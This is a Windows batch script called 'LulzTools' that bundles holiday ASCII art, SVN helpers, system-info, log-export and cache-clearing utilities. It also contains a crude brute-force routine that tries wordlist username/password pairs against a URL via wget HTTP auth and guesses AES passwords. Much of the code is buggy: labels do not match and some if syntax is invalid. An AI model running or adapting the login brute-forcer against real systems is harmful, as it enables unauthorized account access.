set version = Beta 0.1
set branch = Master
cls
echo  __       __    __   __       ________  .___________.  ______     ______    __          _______.
echo |  |     |  |  |  | |  |     |       /  |           | /  __  \   /  __  \  |  |        /       |
echo |  |     |  |  |  | |  |     `---/  /   `---|  |----`|  |  |  | |  |  |  | |  |       |   (----`
echo |  |     |  |  |  | |  |        /  /        |  |     |  |  |  | |  |  |  | |  |        \   \    
echo |  `----.|  `--'  | |  `----.  /  /----.    |  |     |  `--'  | |  `--'  | |  `----.----)   |   
echo |_______| \______/  |_______| /________|    |__|      \______/   \______/  |_______|_______/    
echo.
echo Version: %version%
echo Branch: %branch%     
echo.
echo.
echo.
set Day=%Date:~7,2%
set Month=%Date:~4,2%
if %Day% == 04 (
	if %Month% == 07 (
		echo	       .-"""""""-.
		echo         .'       __  \_
		echo        /        /  \/  \
		echo       |         \_0/\_0/______
		echo       |:.          .'       oo`\
		echo       |:.         /             \
		echo       |' ;        |             |
		echo       |:..   .     \_______     |
		echo       |::.|'     ,  \,_____\   /
		echo       |:::.; ' | .  '|   )_/==================*
 		echo      |::; | | ; ; | |            # # # #::::::
		echo      /::::.|-| |_|-|, \           # # # #::::::
		echo     /'-=-'`  '-'   '--'\          # # # #::::::
		echo jgs /                    \         # # # #::::::
		echo                                   # # # # # # #
		echo           H A P P Y               # # # # # # #
		echo                                   # # # # # # #
		echo   F O U R T H  O F  J U L Y       # # # # # # #
		echo                                   # # # # # # #
		echo                                   # # # # # # #
		echo.
		echo Today is Fourth of July, and i'll be celebratin'
		pause >nul
		cls
		goto system_comcheck
	)
	goto system_comcheck
)
if %Day% == 25 (
	if %Month% == 12 (
		echo    ||::|:||   .--------,
		echo    |:||:|:|   |_______ /        .-.
		echo    ||::|:|| ."`  ___  `".    {\('v')/}
		echo    \\\/\///:  .'`   `'.  ;____`(   )'____
		echo     \====/ './  o   o  \|~     ^" "^   //
		echo      \\//   |   ())) .  |   Season's    \
		echo       ||     \ `.__.'  /|              //
		echo       ||   _{``-.___.-'\|   Greetings   \
		echo       || _." `-.____.-'`|    ___       //
		echo       ||`        __ \   |___/   \_______\
		echo     ."||        (__) \    \|     /
		echo    /   `\/       __   vvvvv'\___/
		echo    |     |      (__)        |
		echo     \___/\                 /
		echo       ||  |     .___.     |
		echo       ||  |       |       |
		echo       ||.-'       |       '-.
		echo   jgs ||          |          )
		echo       ||----------'---------'
		echo.
		echo Today is the beginning of Christmas, and i'll be celebratin'
		pause >nul
		cls
		goto system_comcheck
	)
	goto system_comcheck
)
if %Day% == 05 (
	if %Month% == 04 (
		echo 	   __            /^\
		echo     .'  \          / :.\   
		echo    /     \         | :: \ 
		echo   /   /.  \       / ::: | 
		echo  |    |::. \     / :::'/  
		echo  |   / \::. |   / :::'/
		echo  `--`   \'  `~~~ ':'/`
		echo          /         (    
		echo         /   0 _ 0   \   
		echo       \/     \_/     \/  
		echo     -== '.'   |   '.' ==-   
		echo       /\    '-^-'    /\    
		echo         \   _   _   /             
		echo        .-`-((\o/))-`-.   
		echo   _   /     //^\\     \   _    
		echo ."o".(    , .:::. ,    )."o".  
		echo |o  o\\    \:::::/    //o  o| 
		echo  \    \\   |:::::|   //    /   
		echo   \    \\__/:::::\__//    /   
		echo    \ .:.\  `':::'`  /.:. /      
		echo     \':: |_       _| ::'/  
		echo  jgs `---` `"""""` `---`
		echo.
		echo Today is Easter Monday, and i'll be celebratin'
		pause >nul
		cls
		goto system_comcheck
	)
	goto system_comcheck
)
if %Day% == 13 (
	if %Month% == 10 (
		echo          _          __________                              _,
		echo      _.-(_)._     ."          ".      .--""--.          _.-{__}-._
		echo    .'________'.   | .--------. |    .'        '.      .:-'`____`'-:.
		echo   [____________] /` |________| `\  /   .'``'.   \    /_.-"`_  _`"-._\
		echo   /  / .\/. \  \|  / / .\/. \ \  ||  .'/.\/.\'.  |  /`   / .\/. \   `\
		echo   |  \__/\__/  |\_/  \__/\__/  \_/|  : |_/\_| ;  |  |    \__/\__/    |
		echo   \            /  \            /   \ '.\    /.' / .-\                >/-.
		echo   /'._  --  _.'\  /'._  --  _.'\   /'. `'--'` .'\/   '._-.__--__.-_.'
		echo \/_   `""""`   _\/_   `""""`   _\ /_  `-./\.-'  _\'.    `""""""""`'`\
		echo (__/    '|    \ _)_|           |_)_/            \__)|        '        
		echo   |_____'|_____|   \__________/|;                  `_________'________`;-'
		echo   s'----------'    '----------'   '--------------'`--------------------`
		echo      S T A N          K Y L E        K E N N Y         C A R T M A N
		echo.
		echo Today is the release date of South Park, and i'll be celebratin'
	)
	goto system_comcheck
)
goto system_comcheck

:system_comcheck
if %1 == svn goto svn
if %1 == standalone goto standalone
if %1 == wininfo goto wininfo
if %1 == windowsevents goto windowsevents
if %1 == backdoor goto backdoor_find
if %1 == clear goto clear
if %1 == system goto system_main
if %1 == brute_force goto brute-force

:svn
if %2 == repodump_create (
	if "%3"=="" (
		echo lulztools/main.bat:svn> Usage: %0 project
		goto end
	)
	svn list file:///%cd:\=/%/ | grep ^%3/ > tmp.file
	set /p grepResult=<tmp.file
	del tmp.file
	if "%grepResult%"=="" (
		echo lulztools/main.bat:svn> There is no '%3' project in the current repo
		goto end
	)
	svnadmin dump . > repo.dump
	svndumpfilter include %3/ < repo.dump > %3.dump
	echo lulztools/main.bat:svn> Project '%3" has been succesfully dumped to file %3.dump
	goto end
)
if %2 == initstructure_create (
	if "%3"=="" (
		echo lulztools/main.bat:svn> False init structure
		goto end
	)
	set SVN_REPO = %3
	echo lulztools/main.bat:svn> Initializing basic repository structure (trunk, branches, tags) in %SVN_REPO%
	svn mkdir %SVN_REPO%/trunk %SVN_REPO%/branches %SVN_REPO%/tags -m "Initializing basic repository structure"
	echo lulztools/main.bat:svn> Initializing extended repository structure in %SVN_REPO%
	svn mkdir %SVN_REPO%/branches/experimental %SVN_REPO%/branches/feature %SVN_REPO%/branches/support %SVN_REPO%/branches/release %SVN_REPO%/tags/builds %SVN_REPO%/tags/builds/PA %SVN_REPO%/tags/builds/A %SVN_REPO%/tags/builds/B %SVN_REPO%/tags/releases %SVN_REPO%/tags/releases/AR %SVN_REPO%/tags/releases/BR %SVN_REPO%/tags/releases/RC %SVN_REPO%/tags/releases/ST -m "Initializing extended repository structure"
	goto end
)
if %2 == repodump_import (
	if "%3"=="" (
		echo lulztools/main.bat:svn> Usage: %0 project
		goto end
	)
	svnadmin load . < %3
	goto end
)
if %2 == recursive_add (
	for /f "usebackq tokens=2*" %i in (`svn status ^| findstr /r "^\?"`) do svn add "%i %j"
)
echo lulztools/main.bat:svn> False argument
goto end

:standalone
@setlocal
@SET ANT_HOME=%~dp0apache-ant-1.8.2
@SET GANT_HOME=%~dp0gant-1.9.7
@SET GROOVY_HOME=%GANT_HOME%
 
@set tmp_file=%temp%\%RANDOM%_%RANDOM%.txt
@dir %GANT_HOME%\lib\groovy-all-* /s/b >%tmp_file%
@SET /P GROOVY_ALL_JAR=<%tmp_file%
@del /q %tmp_file%
 
"%JAVA_HOME%\bin\java.exe" ^
-Xmx128m ^
-Dprogram.name="%~n0" ^
-Dgroovy.home="%GROOVY_HOME%" ^
-Dant.home="%ANT_HOME%" ^
-Dgant.home="%GANT_HOME%" ^
-Dgroovy.starter.conf="%GANT_HOME%\conf\gant-starter.conf" ^
-Dscript.name="%~n0" ^
-classpath "%GROOVY_ALL_JAR%;" ^
org.codehaus.groovy.tools.GroovyStarter ^
--main gant.Gant ^
--conf "%GANT_HOME%\conf\gant-starter.conf" ^
--classpath "." %*
echo lulztools/main.bat:standalone> Finished script
goto end

:wininfo
echo lulztools/main.bat:wininfo> Cleaning up Cache from last scan
set _verCmd=
set _verMajor=
set _verMinor=
set _verBuild=
set _verWin=
echo lulztools/main.bat:wininfo> Starting Scan...
set lastbootup = netsh diag show os /v | find "LastBootUpTime"
echo lulztools/main.bat:wininfo> %lastbootup%
set installdate = netsh diag show os /v | find "InstallDate"
echo lulztools/main.bat:wininfo> %installdate%
if %PROCESSOR_ARCHITECTURE%==x86   set pro_arch=32 Bit (x86)
if %PROCESSOR_ARCHITECTURE%==AMD64 set pro_arch=64 Bit (AMD64)
if %PROCESSOR_ARCHITECTURE%==IA64 set pro_arch=Itanium 64 Bit (IA64)
echo lulztools/main.bat:wininfo> Processor Architecture = %pro_arch%
echo lulztools/main.bat:wininfo> CMD Version = %cmdver%
if %cmdver% == 1.01 then set longver=Windows 1.01
if %cmdver% == 2.03 then set longver=Windows 2.03
if %cmdver% == 2.10 then set longver=Windows 2.10
if %cmdver% == 2.11 then set longver=Windows 2.11
if %cmdver% == 3.0 then set longver=Windows 3.0
if %cmdver% == 3.1 then set longver=Windows (for Workgroups/NT) 3.1
if %cmdver% == 3.11 then set longver=Windows for Workgroups 3.11
if %cmdver% == 3.2 then set longver=Windows 3.2 (released only in Simplified Chinese)
if %cmdver% == 3.5 then set longver=Windows NT 3.5
if %cmdver% == 3.51 then set longver=Windows NT 3.51
if %cmdver% == 4.0.950 then set longver=Windows 95
if %cmdver% == 4.0.1381 then set longver=Windows NT 4.0
if %cmdver% == 4.90.3000 then set longver=Windows Me
if %cmdver% == 4.10.1998 then set longver=Windows 98
if %cmdver% == 4.10.2222 then set longver=Windows 98 SE
if %cmdver% == 5.0.2195 then set longver=Windows 2000
if %cmdver% == 5.1.2600 then set longver=Windows XP, Windows Fundamentals for Legacy PCs
if %cmdver% == 5.2.3790 then set longver=Windows XP (Pro), Windows Server 2003
if %cmdver% == 5.2.4500 then set longver=Windows Home Server
if %cmdver% == 6.0.6002 then set longver=Windows Vista, Windows Server 2008
if %cmdver% == 6.1.7600 then set longver=Windows 7, Windows Server 2008 R2
if %cmdver% == 6.1.7601 then set longver=Windows 7 SP1, Windows Server 2008 RS SP1
if %cmdver% == 6.2.9200 then set longver=Windows 8, Windows Server 2012
if %cmdver% == 6.3.9600 then set longver=Windows 8.1, Windows Server 2012 R2
if %cmdver% == 6.4.9841 then set longver=Windows 10 Technical Preview
echo lulztools/main.bat:wininfo> Windows Version = %longver%
pause >nul
goto end

:windowsevents
if not exist psloglist.exe (
	echo lulztools/main.bat:windowsevents> psloglist.exe is missing
	goto end
)
if not exist "Event Logs" md "Event Logs"
if not exist "Event Logs" (
	echo lulztools/main.bat:windowsevents> Cannot create folder Event Logs
	goto end
)
psloglist.exe -s -c -g "C:\IT\Event Logs\Security %date:~4,2%-%date:~7,2%-%date:~10,4%.evt" Security
psloglist.exe -s -c -g "C:\IT\Event Logs\Application %date:~4,2%-%date:~7,2%-%date:~10,4%.evt" Application
psloglist.exe -s -c -g "C:\IT\Event Logs\System %date:~4,2%-%date:~7,2%-%date:~10,4%.evt" System
psloglist.exe -s -c -g "C:\IT\Event Logs\Internet Explorer %date:~4,2%-%date:~7,2%-%date:~10,4%.evt" "Internet Explorer"
echo lulztools/main.bat:windowsevents> Finished script
goto end

:backdoor_find
for /f "tokens=5" %%a in ('netstat -ano ^| find /i "established"') do (
    cls
    echo Please, wait...
    echo Now looking for ID %%a...
    for %%A in (chrome iexplore firefox opera safari tor) do (
        for /f %%b in ('tasklist ^| find "%%a"') do (
            for /f "delims=" %%j in ('echo %%b ^| find /i "%%A.exe"') do set check=%%j
        )
    )
)
if not defined check (
	echo lulztools/main.bat:backdoor_find> There were no backdoors found that were using browsers
	goto end
)
echo lulztools/main.bat:backdoor_find> Your computer is probably backdoored:
echo lulztools/main.bat:backdoor_find> Process %check% is open, but should close.
goto end

:clear
echo lulztools/main.bat:clear> Clearing Java Cache...
set "docandset=%homedrive%\users"
>> c:\Delete.log echo/ "Java\Deployment\cache\6.0\"
for /f "delims=" %%a in ('dir "%docandset%" /ad /b') do (
	for %%b in ("%docandset%\%%a\AppData\LocalLow\Sun\Java\Deployment\cache\6.0" ) do (
		echo %%b >> c:\Delete.log
		cd /d %%b >> c:\Delete.log  2>&1
		rd /s /q %%b >> c:\Delete.log  2>&1
		del /f /s /q %%b >> c:\Delete.log  2>&1
	)
)
echo lulztools/main.bat:clear> Clearing Recycling Bin...
rd /s c:\recycler
echo lulztools/main.bat:clear> Stopping Print Spooler...
net stop spooler
echo lulztools/main.bat:clear> Clearing Print Spooler...
del %windir%\system32\spool\printers\*.* /q
echo lulztools/main.bat:clear> Starting Print Spooler...
net start spooler
echo lulztools/main.bat:clear> Clearing Internet Explorer Cache...
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 255
echo lulztools/main.bat:clear> Clearing up Client Side Cache
if not exist \\%3\c$\Windows\CSC do (
	echo lulztools/main.bat:clear> ERROR: \\%3\c$\Windows\CSC does not exist
	echo lulztools/main.bat:clear> - Computer name should be COMPUTER (not \\COMPUTER or anything else
	echo lulztools/main.bat:clear> - You need access to the C$ Share. (Vista/7 Defaults prevent this)
	pause >nul
	goto end
)
DU -q \\%2\C$\windows\csc
if %ERRORLEVEL% == 9009 do (
	echo lulztools/main.bat:clear> Using dir command instead of du
	echo lulztools/main.bat:clear> NOTE: This may take a longer time, install SysInternals to get du
	dir \\%2\C$\Windows\CSC /w/s
)
echo lulztools/main.bat:clear> Finished Script
goto end

:system_main
cls
echo +=======================[ LulzTools System ]============================+
echo |  [1]  Configurations                                                 |
echo |  [2]  Terms of Service                                               |
echo |                                                                      |
echo |  [E]  Quit Window                                                    |
echo +======================================================================+
set /p option=lulztools/main.bat:system_main> 
if %option% == e then goto end
if %option% == E then goto end
if %option% == 1 then goto system_config
if %option% == 2 then goto system_tos
goto system_main

:system_tos
cls
echo +=======================[ LulzTools System ]============================+
echo | ENGLISH TERMS OF SERVICE                                              |
echo | We are not responsible if you do damage to someone with our hacking   |
echo | tools                                                                 |
echo |                                                                       |
echo | We have warning signs when you get into a function that is able to    |
echo | hack, it has a warning box with yes or no. You can also see the       |
echo | a #h_ before the function name in the terminal. That means that it is |
echo | properly seen if you can hack with it.                                |
echo |                                                                       |
echo | We recommend that you only use it if you have the right to do it, or  |
echo | it is legal in the country or state that you are currently in.        |
echo |                                                                       |
echo | This work is licensed under the Creative Commons Attribution          |
echo | NonCommercial ShareAlike 4.0 International License. To view a copy of |
echo | this license, visit http://creativecommons.org/licenses/by-nc-sa/4.0/ |
echo |                                                                       |
echo |                                                                       |
echo | DUTCH TERMS OF SERVICE                                                |
echo | Wij zijn niet verantwoordelijk als u schade aanricht aan iemands      |
echo | eigendom.                                                             |
echo |                                                                       |
echo | Wij hebben waarschuwingstekenen als je een functie gaat gebruiken     |
echo | waarmee je ook kan hacken, er verschijnt dan een waarschuwingsvenster |
echo | met of je de functie wel of niet wilt gebruiken. Je kan ook een #h_   |
echo | voor de functienaam in de terminal. Dit betekent dus dat je het goed  |
echo | kan zien als je een functie gebruikt die kan hacken.                  |
echo |                                                                       |
echo | Wij bevelen aan dat u het alleen gebruikt als u het recht heeft om    |
echo | het te doen, of als het legaal is in het land of de staat waar u zich |
echo | nu bevindt.                                                           |
echo |                                                                       |
echo | Dit werk is gelicenseerd onder de licentie Creative Commons           |
echo | Naamsvermelding NietCommercieel GelijkDelen 4.0 Internationaal. Ga    |
echo | naar http://creativecommons.org/licenses/by-nc-sa/4.0. om een kopie   |
echo | van de licentie te kunnen lezen.                                      |
echo +=======================================================================+
pause >nul
goto system_main

:system_conf
cls
echo +=======================[ LulzTools System ]============================+
echo | Colours:                                                              |
echo | [C1] Enter Colour                                                     |
echo | [C2] Colour Help                                                      |
echo |                                                                       |
echo | [E] Go back to Main Menu                                              |
echo +=======================================================================+
set /p option=lulztools/main.bat:system_conf> 
if %option% == C1 do (
	set /p color=lulztools/main.bat:system_conf> Colour:
	color %color%
	if %ERRORLEVEL% == 1 do (
		goto system_conf
	)
)
if %option% == c1 do (
	set /p color=lulztools/main.bat:system_conf> Colour:
	color %color%
	if %ERRORLEVEL% == 1 do (
		goto system_conf
	)
)
if %option% == C2 do (
	cls
	color help
	pause >nul 
	goto system_conf
)
if %option% == c2 do (
	cls
	color help
	pause >nul
	goto system_conf
)

:brute_force
cls
echo +=======================[ LulzTools System ]============================+
echo | WARNING: With this application, you could hack into systems and       |
echo | do damage to them. Are you sure you want to continue?                 |
echo |                                                                       |
echo | Press 1 to continue or 0 to stop,                                     |
echo +=======================================================================+
set /p option=lulztools/main.bat:#_brute-force> Option: 
if %option% == 0 then goto end
cls
set TYPE=%2
set INFO=%3
set LIST1=%4
set LIST2=%5

echo lulztools/main.bat:#h_brute-force> Cracking...

if %TYPE% == wget (
FOR /F "skip=1 eol=> tokens=1 delims=" %%a IN (%LIST1%) DO (
	FOR /F "skip=1 eol=> tokens=1 delims=" %%b IN (%LIST2%) DO (
		echo lulztools/main.bat:#h_brute-force> Trying to log in with %%a:%%b
		if %TYPE% == wget (
			echo lulztools/main.bat:#h_brute-force> Trying to log in with %%a:%%b
			wget --http-user=%%a --http-passwd=%%b --quiet %INFO%
			if %ERRORLEVEL% == 0 (
				echo lulztools/main.bat:#h_brute-force> Got username and password from %INFO%
				echo lulztools/main.bat:#h_brute-force> Used: %%a:%%b
				echo lulztools/main.bat:#h_brute-force> It is best to copy down the login data now
				pause >nul
				goto end
			)
		)
	)
)

if %TYPE% == aes (
	FOR /F "skip=1 eol=> tokens=1 delims" %%a in (%LIST1%) DO (
		echo lulztools/main.bat:#h_brute-force> Trying to crack AES encryption with %%a
		aescrypt -d -p %%a %INFO%
		if %ERRORLEVEL% == 0 (
			echo lulztools/main.bat:#h_brute-force> Got username and password from %INFO%
			echo lulztools/main.bat:#h_brute-force> Used: %%a
			pause >nul
			goto end
		)
	)
)
echo lulztools/main.bat:#h_brute-force> Command not found

:end
echo lulztools/main.bat:end> Press any button to exit
pause >nul
